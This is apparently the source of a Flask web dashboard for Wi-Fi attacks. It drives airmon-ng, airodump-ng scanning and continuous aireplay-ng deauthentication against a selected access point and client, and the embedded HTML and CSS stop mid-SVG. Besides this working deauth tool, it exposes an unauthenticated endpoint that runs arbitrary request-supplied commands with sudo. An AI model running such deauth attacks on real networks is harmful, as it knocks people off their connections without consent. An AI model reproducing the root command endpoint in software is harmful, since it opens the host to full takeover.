from flask import Flask, render_template_string, jsonify, request
import subprocess, threading, os, time, csv, re, json, tempfile
from io import StringIO

app = Flask(__name__)

state = {
    'interface': None,
    'monitor_interface': None,
    'scan_process': None,
    'deauth_process': None,
    'networks': [],
    'clients': [],
    'logs': [],
    'scanning': False,
    'deauthing': False,
    'csv_file': None,
}
log_lock = threading.Lock()

def add_log(message, level='info'):
    with log_lock:
        entry = {'time': time.strftime('%H:%M:%S'), 'msg': str(message), 'level': level}
        state['logs'].append(entry)
        if len(state['logs']) > 300:
            state['logs'].pop(0)

def run_cmd(cmd, sudo=True, timeout=10):
    if sudo:
        cmd = ['sudo'] + cmd
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.stderr
    except Exception as e:
        return '', str(e)

def find_monitor_iface():
    """Scan iw dev output and return first interface in monitor mode, or None."""
    out, _ = run_cmd(['iw', 'dev'], sudo=False)
    current = None
    for line in out.split('\n'):
        line = line.strip()
        m = re.match(r'Interface\s+(\S+)', line)
        if m:
            current = m.group(1)
        if 'type monitor' in line and current:
            return current
    return None

def kill_scan_and_deauth():
    """Stop scan and deauth processes before touching the interface."""
    state['scanning'] = False
    state['deauthing'] = False
    for key in ('scan_process', 'deauth_process'):
        proc = state.get(key)
        if proc:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception:
                try: proc.kill()
                except: pass
            state[key] = None

def parse_csv(filepath):
    networks, clients = [], []
    try:
        with open(filepath, 'r', errors='ignore') as f:
            content = f.read()

        # Split by empty lines (airodump separates APs and clients with blank line)
        parts = re.split(r'\r?\n\r?\n', content)

        # Parse networks (first section)
        if len(parts) >= 1:
            lines = parts[0].strip().split('\n')
            # Skip header lines
            for line in lines:
                if 'BSSID' in line and 'channel' in line.lower():
                    continue
                if not line.strip():
                    continue

                try:
                    # Parse CSV line properly
                    reader = csv.reader([line])
                    row = next(reader)

                    if len(row) >= 14:
                        bssid = row[0].strip()
                        # Validate MAC format
                        if re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', bssid):
                            networks.append({
                                'bssid': bssid,
                                'channel': row[3].strip() if len(row) > 3 else '',
                                'privacy': row[5].strip() if len(row) > 5 else '',
                                'cipher': row[6].strip() if len(row) > 6 else '',
                                'auth': row[7].strip() if len(row) > 7 else '',
                                'power': row[8].strip() if len(row) > 8 else '',
                                'beacons': row[9].strip() if len(row) > 9 else '',
                                'essid': row[13].strip() if len(row) > 13 else '',
                            })
                except Exception as e:
                    add_log(f'CSV line parse error: {e}', 'error')
                    continue

        # Parse clients (second section)
        if len(parts) >= 2:
            lines = parts[1].strip().split('\n')
            for line in lines:
                if 'Station MAC' in line or not line.strip():
                    continue

                try:
                    reader = csv.reader([line])
                    row = next(reader)

                    if len(row) >= 6:
                        mac = row[0].strip()
                        if re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', mac):
                            clients.append({
                                'mac': mac,
                                'ap_bssid': row[5].strip() if len(row) > 5 else '',
                                'power': row[3].strip() if len(row) > 3 else '',
                                'frames': row[4].strip() if len(row) > 4 else '0',
                                'probes': row[6].strip() if len(row) > 6 else '',
                            })
                except Exception:
                    continue

        add_log(f'Parsed: {len(networks)} networks, {len(clients)} clients', 'info')

    except Exception as e:
        add_log(f'CSV parse error: {e}', 'error')

    return networks, clients

def scan_worker(channel=None, bssid=None):
    tmpdir = tempfile.mkdtemp()
    csv_path = os.path.join(tmpdir, 'scan')
    state['csv_file'] = csv_path + '-01.csv'
    
    # Use EXACT commands you verified work
    if channel and bssid:
        cmd = ['sudo', 'airodump-ng', '-c', str(channel), '--bssid', bssid, 
               '--output-format', 'csv', '-w', csv_path, state['monitor_interface']]
        add_log(f'Running: sudo airodump-ng -c {channel} --bssid {bssid} {state["monitor_interface"]}', 'info')
    else:
        cmd = ['sudo', 'airodump-ng', '--output-format', 'csv', '-w', csv_path, 
               state['monitor_interface']]
        add_log(f'Running: sudo airodump-ng {state["monitor_interface"]}', 'info')
    
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
        state['scan_process'] = proc
        
        # Also log stderr for debugging
        def log_errors():
            for line in proc.stderr:
                if line.strip():
                    add_log(f'airodump: {line.strip()}', 'info')
        threading.Thread(target=log_errors, daemon=True).start()
        
        while state['scanning']:
            time.sleep(2)
            if os.path.exists(state['csv_file']):
                nets, clients = parse_csv(state['csv_file'])
                state['networks'] = nets
                state['clients'] = clients
        
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except:
            proc.kill()
            
    except Exception as e:
        add_log(f'Scan error: {e}', 'error')
    
    state['scanning'] = False
    state['scan_process'] = None

def iface_is_monitor(iface):
    """Return True if iface exists and is in monitor mode right now."""
    if not iface:
        return False
    out, _ = run_cmd(['iw', 'dev', iface, 'info'], sudo=False)
    return 'type monitor' in out

def deauth_worker(bssid, client, iface):
    # Verify interface is still in monitor mode before starting
    if not iface_is_monitor(iface):
        add_log(f'[DEAUTH] Interface {iface} is no longer in monitor mode — aborting', 'error')
        add_log('Re-enable monitor mode and try again', 'warn')
        state['deauthing'] = False
        state['deauth_process'] = None
        return

    cmd = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, '-c', client, iface]
    add_log(f'DEAUTH START | AP: {bssid} | Target: {client} | Iface: {iface}', 'attack')

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1)
        state['deauth_process'] = proc

        packet_count = 0
        for line in proc.stdout:
            line = line.strip()
            if not state['deauthing']:
                break
            # Only log meaningful lines — skip verbose per-packet noise
            if line:
                low = line.lower()
                if 'deauth' in low or 'sent' in low or 'error' in low or 'no such' in low or 'permission' in low:
                    add_log(line, 'attack')
                elif 'waiting' in low or 'notice' in low:
                    add_log(line, 'warn')
                # silently count packet lines without logging each one
                if 'deauth' in low:
                    packet_count += 1

        proc.terminate()
        try:
            proc.wait(timeout=3)
        except Exception:
            proc.kill()

    except Exception as e:
        add_log(f'Deauth error: {e}', 'error')

    state['deauthing'] = False
    state['deauth_process'] = None
    add_log('Deauth stopped', 'warn')

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/interfaces')
def get_interfaces():
    out, _ = run_cmd(['iw', 'dev'], sudo=False)
    ifaces = []
    current = None
    for line in out.split('\n'):
        line = line.strip()
        m = re.match(r'Interface\s+(\S+)', line)
        if m:
            current = m.group(1)
        if 'type managed' in line and current and current not in ifaces:
            ifaces.append(current)
    # Also grab monitor interfaces so user can see what's active
    mon = find_monitor_iface()
    if mon and mon not in ifaces:
        ifaces.append(mon)
    return jsonify({'interfaces': ifaces, 'monitor_active': mon})

@app.route('/api/test/cmd', methods=['POST'])
def test_command():
    """Test endpoint to run arbitrary commands for debugging"""
    cmd_str = request.json.get('cmd', '')
    if not cmd_str:
        return jsonify({'error': 'No command'}), 400

    import shlex
    cmd = shlex.split(cmd_str)
    out, err = run_cmd(cmd, sudo=True, timeout=30)

    return jsonify({
        'stdout': out,
        'stderr': err,
        'cmd': cmd_str
    })

@app.route('/api/monitor/start', methods=['POST'])
def start_monitor():
    iface = request.json.get('interface', '')
    if not iface:
        return jsonify({'error': 'No interface specified'}), 400
    
    # Step 1: Kill conflicting processes
    add_log('=== STEP 1: Killing conflicting processes ===', 'info')
    add_log(f'Running: sudo airmon-ng check kill', 'info')
    
    out, err = run_cmd(['airmon-ng', 'check', 'kill'])
    
    if out:
        add_log(f'STDOUT: {out[:500]}', 'info')
    if err:
        add_log(f'STDERR: {err[:500]}', 'error')
    
    time.sleep(2)
    
    # Step 2: Check current interfaces before starting
    add_log('=== STEP 2: Current interfaces before monitor mode ===', 'info')
    iw_out, _ = run_cmd(['iw', 'dev'], sudo=False)
    add_log(f'Interfaces before:\n{iw_out}', 'info')
    
    # Step 3: Start monitor mode
    add_log(f'=== STEP 3: Starting monitor mode on {iface} ===', 'info')
    add_log(f'Running: sudo airmon-ng start {iface}', 'info')
    
    out, err = run_cmd(['airmon-ng', 'start', iface])
    
    if out:
        add_log(f'STDOUT:\n{out}', 'info')
    if err:
        add_log(f'STDERR:\n{err}', 'error')
    
    time.sleep(3)
    
    # Step 4: Check interfaces after airmon-ng start
    add_log('=== STEP 4: Interfaces after airmon-ng start ===', 'info')
    iw_out, _ = run_cmd(['iw', 'dev'], sudo=False)
    add_log(f'Interfaces after:\n{iw_out}', 'info')
    
    # Step 5: Try to find monitor interface
    add_log('=== STEP 5: Detecting monitor interface ===', 'info')
    
    # Check common naming patterns
    possible_names = [
        iface + 'mon',           # wlan0mon
        iface.replace('wl', 'mon'),  # mon0
        'mon0',
        iface + '_mon'
    ]
    
    mon = None
    for name in possible_names:
        check_out, _ = run_cmd(['iw', 'dev', name, 'info'], sudo=False)
        if 'Interface' in check_out and 'monitor' in check_out.lower():
            mon = name
            add_log(f'✓ Found monitor interface: {mon}', 'success')
            break
        else:
            add_log(f'  Checked {name}: not found or not monitor mode', 'info')
    
    # If still not found, scan iw dev output for ANY monitor interface
    if not mon:
        add_log('Scanning for any monitor interface in iw dev output...', 'info')
        lines = iw_out.split('\n')
        current_iface = None
        for line in lines:
            if 'Interface' in line:
                current_iface = line.split()[-1]
            if 'type monitor' in line and current_iface:
                mon = current_iface
                add_log(f'✓ Found monitor interface: {mon}', 'success')
                break
    
    # Last resort: try iwconfig
    if not mon:
        add_log('Trying iwconfig...', 'info')
        iwconfig_out, _ = run_cmd(['iwconfig'], sudo=False)
        for line in iwconfig_out.split('\n'):
            if 'Mode:Monitor' in line:
                mon = line.split()[0]
                add_log(f'✓ Found via iwconfig: {mon}', 'success')
                break
    
    if not mon:
        add_log('❌ ERROR: Could not detect monitor interface!', 'error')
        add_log('Try manually: sudo airmon-ng start wlan0', 'error')
        return jsonify({'error': 'Monitor interface not found after airmon-ng start'}), 500
    
    # Step 6: Test if monitor interface works
    add_log('=== STEP 6: Testing monitor interface ===', 'info')
    test_out, _ = run_cmd(['iw', 'dev', mon, 'info'], sudo=False)
    add_log(f'Interface {mon} info:\n{test_out}', 'info')
    
    state['interface'] = iface
    state['monitor_interface'] = mon
    add_log(f'SUCCESS: Monitor mode active → {mon}', 'success')
    
    return jsonify({'monitor_interface': mon})
      
@app.route('/api/monitor/stop', methods=['POST'])
def stop_monitor():
    add_log('=== STOPPING MONITOR MODE ===', 'info')
    
    # Kill any running scans or deauth first
    kill_scan_and_deauth()
    time.sleep(1)
    
    # Check current interfaces
    add_log('Current interfaces:', 'info')
    iw_out, _ = run_cmd(['iw', 'dev'], sudo=False)
    add_log(f'{iw_out}', 'info')
    
    mon = state.get('monitor_interface')
    
    if mon:
        add_log(f'Stopping monitor interface: {mon}', 'info')
        add_log(f'Running: sudo airmon-ng stop {mon}', 'info')
        
        out, err = run_cmd(['airmon-ng', 'stop', mon])
        
        if out:
            add_log(f'STDOUT:\n{out}', 'info')
        if err:
            add_log(f'STDERR:\n{err}', 'error')
        
        time.sleep(2)
    
    # Check interfaces after stop
    add_log('Interfaces after stop:', 'info')
    iw_out, _ = run_cmd(['iw', 'dev'], sudo=False)
    add_log(f'{iw_out}', 'info')
    
    # Bring original interface up if needed
    orig = state.get('interface')
    if orig:
        add_log(f'Bringing {orig} up...', 'info')
        out, err = run_cmd(['ip', 'link', 'set', orig, 'up'])
        if err:
            add_log(f'Error bringing {orig} up: {err}', 'error')
        time.sleep(1)
    
    # Restart network services
    add_log('Restarting NetworkManager and wpa_supplicant...', 'info')
    add_log('Running: sudo systemctl restart NetworkManager wpa_supplicant', 'info')
    
    out, err = run_cmd(['systemctl', 'restart', 'NetworkManager', 'wpa_supplicant'])
    if err:
        add_log(f'Error restarting services: {err}', 'error')
    
    time.sleep(3)
    
    # Check service status
    nm_status, _ = run_cmd(['systemctl', 'is-active', 'NetworkManager'], sudo=False)
    wpa_status, _ = run_cmd(['systemctl', 'is-active', 'wpa_supplicant'], sudo=False)
    
    add_log(f'NetworkManager status: {nm_status.strip()}', 'info')
    add_log(f'wpa_supplicant status: {wpa_status.strip()}', 'info')
    
    # Final interface check
    add_log('Final interface state:', 'info')
    iw_out, _ = run_cmd(['iw', 'dev'], sudo=False)
    add_log(f'{iw_out}', 'info')
    
    state['monitor_interface'] = None
    state['interface'] = None
    add_log('Monitor mode stopped', 'success')
    
    return jsonify({'status': 'ok'})

@app.route('/api/scan/start', methods=['POST'])
def start_scan():
    if not state['monitor_interface']: return jsonify({'error': 'Start monitor mode first'}), 400
    if state['scanning']:
        # Stop current scan gracefully before restarting
        state['scanning'] = False
        if state['scan_process']:
            try: state['scan_process'].terminate()
            except: pass
        time.sleep(1)
    data = request.json or {}
    channel = data.get('channel')
    bssid = data.get('bssid')
    state['scanning'] = True
    state['networks'] = []
    state['clients'] = []
    threading.Thread(target=scan_worker, args=(channel, bssid), daemon=True).start()
    return jsonify({'status': 'ok'})

@app.route('/api/scan/stop', methods=['POST'])
def stop_scan():
    state['scanning'] = False
    if state['scan_process']:
        try: state['scan_process'].terminate()
        except: pass
    add_log('Scan stopped', 'info')
    return jsonify({'status': 'ok'})

@app.route('/api/scan/results')
def scan_results():
    return jsonify({'networks': state['networks'], 'clients': state['clients'], 'scanning': state['scanning']})

@app.route('/api/deauth/start', methods=['POST'])
def start_deauth():
    data = request.json
    bssid, client = data.get('bssid', ''), data.get('client', '')
    if not bssid or not client:
        return jsonify({'error': 'Need BSSID and client MAC'}), 400
    if not state['monitor_interface']:
        return jsonify({'error': 'Monitor mode not active'}), 400

    # If deauth is already running, stop it cleanly first
    if state['deauthing']:
        add_log('Stopping previous deauth before restarting...', 'warn')
        state['deauthing'] = False
        proc = state.get('deauth_process')
        if proc:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception:
                try: proc.kill()
                except: pass
            state['deauth_process'] = None
        time.sleep(0.5)

    # Verify monitor interface is still alive
    iface = state['monitor_interface']
    if not iface_is_monitor(iface):
        # Try to re-detect a monitor interface
        found = find_monitor_iface()
        if found:
            add_log(f'Monitor iface changed: using {found} instead of {iface}', 'warn')
            state['monitor_interface'] = found
            iface = found
        else:
            state['monitor_interface'] = None
            return jsonify({'error': f'Monitor interface {iface} is gone. Re-enable monitor mode.'}), 400

    state['deauthing'] = True
    threading.Thread(target=deauth_worker, args=(bssid, client, iface), daemon=True).start()
    return jsonify({'status': 'ok'})

@app.route('/api/deauth/stop', methods=['POST'])
def stop_deauth():
    state['deauthing'] = False
    if state['deauth_process']:
        try: state['deauth_process'].terminate()
        except: pass
    return jsonify({'status': 'ok'})

@app.route('/api/status')
def get_status():
    return jsonify({
        'monitor_interface': state['monitor_interface'],
        'scanning': state['scanning'],
        'deauthing': state['deauthing'],
        'network_count': len(state['networks']),
        'client_count': len(state['clients']),
    })

@app.route('/api/logs')
def get_logs():
    since = request.args.get('since', 0, type=int)
    with log_lock:
        return jsonify({'logs': state['logs'][since:], 'total': len(state['logs'])})

@app.route('/api/logs/clear', methods=['POST'])
def clear_logs():
    with log_lock:
        state['logs'].clear()
    return jsonify({'status': 'ok'})

HTML = r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WiFi Pen-Test Dashboard</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root {
    --bg-primary: #f6f8fa;
    --bg-secondary: #ffffff;
    --bg-tertiary: #f0f2f5;
    --border-light: #e1e4e8;
    --border-medium: #c9d1d9;
    --text-primary: #0d1117;
    --text-secondary: #57606a;
    --text-muted: #8b949e;
    --accent-primary: #0969da;
    --accent-success: #1a7f37;
    --accent-danger: #cf222e;
    --accent-warning: #9a6700;
    --accent-info: #6639ba;
    --accent-primary-bg: #ddf4ff;
    --accent-success-bg: #dafbe1;
    --accent-danger-bg: #ffebe9;
    --accent-warning-bg: #fff8c5;
    --shadow-sm: 0 1px 3px rgba(0,0,0,0.08);
    --shadow-md: 0 4px 12px rgba(0,0,0,0.1);
    --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    --font-mono: 'IBM Plex Mono', 'SF Mono', 'Fira Code', monospace;
    --radius: 8px;
    --radius-sm: 6px;
}

@media (prefers-color-scheme: dark) {
    :root {
        --bg-primary: #0d1117;
        --bg-secondary: #161b22;
        --bg-tertiary: #21262d;
        --border-light: #30363d;
        --border-medium: #484f58;
        --text-primary: #e6edf3;
        --text-secondary: #8b949e;
        --text-muted: #6e7681;
        --accent-primary: #58a6ff;
        --accent-success: #3fb950;
        --accent-danger: #f85149;
        --accent-warning: #d29922;
        --accent-info: #bc8cff;
        --accent-primary-bg: rgba(88,166,255,0.1);
        --accent-success-bg: rgba(63,185,80,0.1);
        --accent-danger-bg: rgba(248,81,73,0.1);
        --accent-warning-bg: rgba(210,153,34,0.1);
        --shadow-sm: 0 1px 3px rgba(0,0,0,0.3);
        --shadow-md: 0 4px 12px rgba(0,0,0,0.4);
    }
}

* { margin: 0; padding: 0; box-sizing: border-box; }

body {
    font-family: var(--font-sans);
    background: var(--bg-primary);
    color: var(--text-primary);
    font-size: 14px;
    line-height: 1.6;
    height: 100vh;
    overflow: hidden;
}

.app {
    display: grid;
    grid-template-rows: 56px 1fr;
    grid-template-columns: 260px 1fr 300px;
    height: 100vh;
}

/* ── Header ── */
header {
    grid-column: 1 / -1;
    background: var(--bg-secondary);
    border-bottom: 1px solid var(--border-light);
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 20px;
    box-shadow: var(--shadow-sm);
    gap: 16px;
}

.logo {
    display: flex;
    align-items: center;
    gap: 10px;
    font-weight: 700;
    font-size: 15px;
    color: var(--text-primary);
    letter-spacing: 0.3px;
    flex-shrink: 0;
}

.logo svg { width: 24px; height: 24px; }

.status-pills {
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
}

.pill {
    padding: 4px 12px;
    border-radius: 20px;
    font-size: 12px;
    font-weight: 600;
    font-family: var(--font-mono);
    background: var(--bg-tertiary);
    color: var(--text-muted);
    border: 1px solid var(--border-light);
    letter-spacing: 0.3px;
}
.pill.active { background: var(--accent-success-bg); color: var(--accent-success); border-color: var(--accent-success); }
.pill.attacking { background: var(--accent-danger-bg); color: var(--accent-danger); border-color: var(--accent-danger); }

#clock {
    font-family: var(--font-mono);
    font-size: 13px;
    color: var(--text-muted);
    flex-shrink: 0;
}

/* ── Sidebar ── */
.sidebar {
    background: var(--bg-secondary);
    border-right: 1px solid var(--border-light);
    overflow-y: auto;
    padding: 16px 0 20px;
    display: flex;
    flex-direction: column;
    gap: 0;
}

.section-label {
    padding: 0 16px 8px;
    font-size: 11px;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    color: var(--text-muted);
}

.ctrl-block {
    padding: 14px 16px;
    border-bottom: 1px solid var(--border-light);
}

.ctrl-label {
    font-size: 12px;
    font-weight: 600;
    color: var(--text-secondary);
    margin-bottom: 10px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

select, input[type="text"] {
    width: 100%;
    padding: 8px 10px;
    border: 1px solid var(--border-medium);
    border-radius: var(--radius-sm);
    font-size: 13px;
    font-family: var(--font-sans);
    background: var(--bg-primary);
    color: var(--text-primary);
    margin-bottom: 10px;
    transition: border-color 0.15s, box-shadow 0.15s;
}
select:focus, input[type="text"]:focus {
    outline: none;
    border-color: var(--accent-primary);
    box-shadow: 0 0 0 3px var(--accent-primary-bg);
}

.btn {
    width: 100%;
    padding: 8px 14px;
    border-radius: var(--radius-sm);
    font-size: 13px;
    font-weight: 600;
    border: 1px solid transparent;
    cursor: pointer;
    transition: all 0.15s;
    margin-bottom: 6px;
    font-family: var(--font-sans);
    letter-spacing: 0.2px;
}
.btn:disabled { opacity: 0.5; cursor: not-allowed; }
.btn-primary { background: var(--accent-primary); color: #fff; }
.btn-primary:hover:not(:disabled) { filter: brightness(1.1); }
.btn-success { background: var(--accent-success); color: #fff; }
.btn-success:hover:not(:disabled) { filter: brightness(1.1); }
.btn-danger { background: var(--accent-danger); color: #fff; }
.btn-danger:hover:not(:disabled) { filter: brightness(1.1); }
.btn-warning { background: var(--accent-warning); color: #fff; }
.btn-warning:hover:not(:disabled) { filter: brightness(1.1); }
.btn-outline {
    background: transparent;
    border: 1px solid var(--border-medium);
    color: var(--text-primary);
}
.btn-outline:hover:not(:disabled) { background: var(--bg-tertiary); }

.nav-tabs { padding: 12px 10px 0; }

.tab-btn {
    display: flex;
    align-items: center;
    gap: 10px;
    width: 100%;
    padding: 10px 14px;
    background: transparent;
    border: none;
    border-radius: var(--radius-sm);
    color: var(--text-secondary);
    font-size: 13px;
    font-weight: 500;
    font-family: var(--font-sans);
    cursor: pointer;
    transition: all 0.15s;
    margin-bottom: 2px;
    letter-spacing: 0.2px;
}
.tab-btn:hover { background: var(--bg-tertiary); color: var(--text-primary); }
.tab-btn.active { background: var(--accent-primary); color: #fff; font-weight: 600; }

.tab-icon {
    width: 18px;
    height: 18px;
    opacity: 0.75;
    flex-shrink: 0;
}

/* ── Main ── */
main {
    background: var(--bg-primary);
    overflow-y: auto;
    padding: 24px 28px;
}

.tab-panel { display: none; }
.tab-panel.active { display: block; }

.panel-title {
    font-size: 20px;
    font-weight: 700;
    color: var(--text-primary);
    margin-bottom: 6px;
    letter-spacing: -0.3px;
}
.panel-sub {
    font-size: 14px;
    color: var(--text-secondary);
    margin-bottom: 24px;
}

/* ── Cards ── */
.card {
    background: var(--bg-secondary);
    border: 1px solid var(--border-light);
    border-radius: var(--radius);
    padding: 20px;
    margin-bottom: 18px;
    box-shadow: var(--shadow-sm);
}
.card-title {
    font-size: 14px;
    font-weight: 600;
    color: var(--text-primary);
    margin-bottom: 14px;
    padding-bottom: 10px;
    border-bottom: 1px solid var(--border-light);
    text-transform: uppercase;
    letter-spacing: 0.4px;
}

/* ── Tables ── */
.data-table { width: 100%; border-collapse: collapse; font-size: 13px; }
.data-table th {
    text-align: left;
    padding: 10px 12px;
    background: var(--bg-tertiary);
    color: var(--text-secondary);
    font-weight: 600;
    font-size: 12px;
    border-bottom: 1px solid var(--border-medium);
    text-transform: uppercase;
    letter-spacing: 0.4px;
}
.data-table td {
    padding: 10px 12px;
    border-bottom: 1px solid var(--border-light);
    color: var(--text-primary);
    font-size: 13px;
}
.data-table tr:hover td { background: var(--bg-tertiary); cursor: pointer; }
.data-table tr.selected td {
    background: var(--accent-primary-bg);
    border-left: 2px solid var(--accent-primary);
}

.badge {
    display: inline-block;
    padding: 2px 8px;
    border-radius: 12px;
    font-size: 11px;
    font-weight: 600;
    font-family: var(--font-mono);
}
.badge-wpa2 { background: var(--accent-warning-bg); color: var(--accent-warning); }
.badge-wpa3 { background: var(--accent-primary-bg); color: var(--accent-primary); }
.badge-open { background: var(--accent-danger-bg); color: var(--accent-danger); }

/* ── Target boxes ── */
.target-box {
    background: var(--bg-tertiary);
    border: 1px solid var(--border-light);
    border-radius: var(--radius-sm);
    padding: 10px 14px;
    margin-bottom: 8px;
}
.target-label { font-size: 11px; color: var(--text-muted); margin-bottom: 3px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.4px; }
.target-val { font-size: 14px; font-family: var(--font-mono); color: var(--text-primary); font-weight: 500; }
.target-val.empty { color: var(--text-muted); font-style: italic; font-family: var(--font-sans); }

/* ── Log Panel ── */
.log-panel {
    background: var(--bg-secondary);
    border-left: 1px solid var(--border-light);
    display: flex;
    flex-direction: column;
    overflow: hidden;
}
.log-header {
    padding: 14px 16px;
    border-bottom: 1px solid var(--border-light);
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 12px;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    color: var(--text-secondary);
    flex-shrink: 0;
}
.log-clear-btn {
    background: none;
    border: 1px solid var(--border-medium);
    color: var(--text-muted);
    cursor: pointer;
    font-family: var(--font-mono);
    font-size: 11px;
    padding: 3px 10px;
    border-radius: var(--radius-sm);
    transition: all 0.15s;
}
.log-clear-btn:hover { background: var(--accent-danger-bg); color: var(--accent-danger); border-color: var(--accent-danger); }

.log-scroll {
    flex: 1;
    overflow-y: auto;
    padding: 10px;
    font-family: var(--font-mono);
    font-size: 12px;
    background: var(--bg-primary);
}
.log-entry {
    padding: 4px 8px;
    border-radius: 4px;
    margin-bottom: 2px;
    display: flex;
    gap: 10px;
    align-items: flex-start;
    line-height: 1.5;
}
.log-time { color: var(--text-muted); flex-shrink: 0; font-size: 11px; margin-top: 1px; }
.log-msg { word-break: break-all; }
.log-info .log-msg { color: var(--text-secondary); }
.log-success .log-msg { color: var(--accent-success); }
.log-error .log-msg { color: var(--accent-danger); font-weight: 600; }
.log-warn .log-msg { color: var(--accent-warning); }
.log-attack .log-msg { color: var(--accent-info); }

/* ── Learn section ── */
.learn-step { display: none; }
.learn-step.active { display: block; }

.learn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; }

.concept-card {
    background: var(--bg-secondary);
    border: 1px solid var(--border-light);
    border-radius: var(--radius);
    overflow: hidden;
    box-shadow: var(--shadow-sm);
}
.concept-header {
    padding: 16px 20px;
    background: var(--bg-tertiary);
    border-bottom: 1px solid var(--border-light);
    display: flex;
    align-items: center;
    gap: 14px;
}
.concept-num {
    font-size: 22px;
    font-weight: 700;
    color: var(--accent-primary);
    font-family: var(--font-mono);
    flex-shrink: 0;
}
.concept-title { font-size: 16px; font-weight: 600; color: var(--text-primary); }
.concept-body { padding: 20px; }
.concept-body p { color: var(--text-secondary); margin-bottom: 14px; line-height: 1.7; font-size: 14px; }
.concept-body strong { color: var(--text-primary); }
.concept-body code { font-family: var(--font-mono); font-size: 12px; background: var(--bg-tertiary); padding: 1px 5px; border-radius: 3px; }
.concept-body ul { list-style: none; padding: 0; }
.concept-body li {
    padding: 7px 0 7px 22px;
    position: relative;
    color: var(--text-secondary);
    font-size: 13px;
    line-height: 1.6;
    border-bottom: 1px solid var(--border-light);
}
.concept-body li:last-child { border-bottom: none; }
.concept-body li::before { content: "→"; position: absolute; left: 2px; color: var(--accent-primary); font-weight: 700; }

/* SVG anim box */
.anim-box {
    background: #0d1117;
    border-radius: var(--radius-sm);
    padding: 16px;
    margin: 16px 0;
    border: 1px solid #30363d;
    overflow: hidden;
}
.anim-box svg { width: 100%; height: auto; display: block; }

/* ── Stepper nav ── */
.stepper-nav {
    display: flex;
    gap: 8px;
    margin-bottom: 22px;
    flex-wrap: wrap;
}
.step-btn {
    padding: 8px 16px;
    border: 1px solid var(--border-medium);
    border-radius: var(--radius-sm);
    background: var(--bg-secondary);
    color: var(--text-secondary);
    font-size: 13px;
    font-weight: 500;
    font-family: var(--font-mono);
    cursor: pointer;
    transition: all 0.15s;
}
.step-btn:hover { background: var(--bg-tertiary); color: var(--text-primary); }
.step-btn.active { background: var(--accent-primary); color: #fff; border-color: var(--accent-primary); }

/* ── Attack section ── */
.big-btn {
    width: 100%;
    padding: 14px;
    border-radius: var(--radius);
    font-size: 15px;
    font-weight: 700;
    border: none;
    cursor: pointer;
    transition: all 0.15s;
    font-family: var(--font-sans);
    letter-spacing: 0.3px;
}
.big-btn-red { background: var(--accent-danger); color: #fff; }
.big-btn-red:hover { filter: brightness(1.1); box-shadow: var(--shadow-md); }
.big-btn-red.active { background: #6e1a18; box-shadow: inset 0 2px 4px rgba(0,0,0,0.3); }

.counter-box { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 14px 0; }
.counter { background: var(--bg-tertiary); padding: 14px; border-radius: var(--radius-sm); text-align: center; border: 1px solid var(--border-light); }
.counter-num { font-size: 26px; font-weight: 700; color: var(--accent-primary); font-family: var(--font-mono); }
.counter-lbl { font-size: 11px; color: var(--text-muted); margin-top: 4px; text-transform: uppercase; letter-spacing: 0.4px; }

.input-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
.input-group label { display: block; font-size: 12px; font-weight: 600; color: var(--text-secondary); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.4px; }

/* ── Misc ── */
::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-track { background: var(--bg-tertiary); }
::-webkit-scrollbar-thumb { background: var(--border-medium); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }

@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }

.empty { text-align: center; padding: 36px; color: var(--text-muted); font-size: 14px; }
.empty-icon { font-size: 28px; margin-bottom: 10px; opacity: 0.4; }

/* ── Responsive ── */
@media (max-width: 1100px) {
    .app { grid-template-columns: 240px 1fr 280px; }
}
@media (max-width: 900px) {
    .app { grid-template-columns: 1fr; grid-template-rows: 56px auto 1fr 220px; }
    .sidebar { grid-row: 2; grid-column: 1; display: flex; flex-direction: row; flex-wrap: wrap; overflow-x: auto; padding: 10px; border-right: none; border-bottom: 1px solid var(--border-light); }
    .ctrl-block { border-bottom: none; border-right: 1px solid var(--border-light); padding: 10px; min-width: 180px; }
    .log-panel { grid-row: 4; grid-column: 1; }
    main { grid-row: 3; grid-column: 1; overflow-y: auto; }
}

/* power bar */
.power-bar { display: inline-block; width: 50px; height: 6px; background: var(--border-light); border-radius: 3px; vertical-align: middle; margin-right: 6px; }
.power-fill { display: block; height: 100%; border-radius: 3px; background: var(--accent-success); transition: width 0.3s; }
</style>
</head>
<body>
<div class="app">

<!-- HEADER -->
<header>
  <div class="logo">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
      <path d="M1 6c3.2-3.2 7.5-5 11-5s7.8 1.8 11 5"/>
